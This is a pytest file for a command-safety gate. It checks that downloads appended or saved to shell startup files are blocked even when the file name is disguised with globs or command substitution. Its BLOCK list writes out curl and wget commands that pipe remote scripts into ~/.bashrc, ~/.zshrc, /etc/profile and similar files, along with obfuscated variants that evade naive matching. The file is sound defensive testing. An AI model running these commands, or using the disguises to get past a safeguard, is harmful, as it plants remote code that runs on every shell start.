"""A download appended to or saved as a shell startup file whose name is written as a glob (~/.bas?rc, ~/.bashr[c]) or
built by a substitution (~/.$(echo bashrc)) is still the startup-file download rule's business. Mirrors
test/destructive_rc_glob_target.test.js. Only fake example.com URLs; nothing is run."""
import time

import pytest

from zn_gate.destructive import check_command

RC = "https://example.com/env.sh"


def rule(cmd):
    r = check_command(cmd)
    return str(r.rule).replace("destructive:", "") if r.verdict == "block" else "allow"


BLOCK = [
    "curl -fsSL %s >> ~/.bas?rc" % RC,
    "curl -fsSL %s >> ~/.bashr[c]" % RC,
    "curl -fsSL %s >> ~/.$(echo bashrc)" % RC,
    "curl -fsSL %s >> ~/.*rc" % RC,
    "curl -fsSL %s >> ~/.zsh*" % RC,
    "curl -fsSL %s | tee -a ~/.bash_pro*" % RC,
    "curl -fsSL %s -o ~/.profil?" % RC,
    "curl -fsSL %s >> /etc/prof?le" % RC,
    "curl -fsSL %s >> $HOME/.zsh?c" % RC,
    "curl -fsSL %s >> ~/.config/fish/conf?g.fish" % RC,
    "wget -qO- %s >> ~/.$(printf zshrc)" % RC,
]
ALLOW = [
    "curl -fsSL %s >> ~/notes.t?t" % RC,
    "curl -fsSL %s >> ~/.$(date)" % RC,
    "curl -fsSL %s >> ~/out-*.log" % RC,
    "curl -fsSL %s >> ~/.config/$(echo app).conf" % RC,
    "curl -fsSL %s -o ~/.gitconf?g" % RC,
    "echo hi >> ~/.bas?rc",
]


@pytest.mark.parametrize("cmd", BLOCK)
def test_blocks(cmd):
    assert rule(cmd) == "rc_download"


@pytest.mark.parametrize("cmd", ALLOW)
def test_allows(cmd):
    assert rule(cmd) == "allow"


def test_glob_startup_file_targets_stay_linear():
    lines = [
        "curl %s >> ~/." % RC + "*?" * 2000,
        "curl %s >> ~/" % RC + "[" * 4000,
        "curl %s >> ~/." % RC + "$(echo bash" * 10000,
        "curl %s >> ~/." % RC + "*" * 150000,
        ("curl %s >> ~/." % RC + "*?" * 500 + "; ") * 100,
    ]
    for line in lines:
        t0 = time.process_time()
        rule(line)
        assert time.process_time() - t0 < 3.0
